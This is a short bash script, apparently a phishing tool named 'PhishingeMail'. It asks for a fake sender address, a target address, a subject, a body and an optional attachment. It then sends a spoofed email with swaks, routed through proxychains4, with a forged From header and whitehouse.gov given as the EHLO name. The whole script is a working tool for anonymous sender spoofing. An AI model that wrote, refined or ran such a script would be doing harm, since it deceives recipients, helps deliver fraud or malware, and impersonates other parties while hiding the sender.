#!/usr/bin/bash

#Print character painting
figlet PhishingeMail

echo "Please enter a fake email address: "
read inputinfo
echo -e "\033[32m Forged email address: $inputinfo \033[0m"

echo "Please enter the destination email address: "
read target
echo -e "\033[31m Destination email address: $target \033[0m"

echo "Please enter the attachment path, please do not set if not: "
read file
echo "Success,Next...."

echo "Please enter the mail title:"
read title
echo -e "\033[33m Title: $title \033[0m" 

echo "Please enter the email text:"
read text

echo "This email information:"
echo -e "\033[34m Title: $title \033[0m"
echo -e "\033[35m Text: $text \033[0m"

sleep 5s
echo -e "\033[42;37m Sending...... \033[0m"


#Temporary variables

#title
var1="$title"
var2="$inputinfo"
var3="${title}<${inputinfo}>"
var4="Subject:""$var1"

#debug
#echo $var4

#Determine whether to send files

if [ "$file" = "" ];then
	echo "No need to send files..."
	proxychains4 -q swaks --to "$target" --from "$inputinfo"\
                   	--header-X-Mailer SMTP  --ehlo whitehouse.gov --body "$text" --header "$var4" --h-From: "$var3"
	
	
else

	proxychains4 -q swaks --to "$target" --from "$inputinfo" --header-X-Mailer SMTP  --ehlo whitehouse.gov --body "$text" --attach "$file" --header "$var4" --h-From: "$var3"
fi



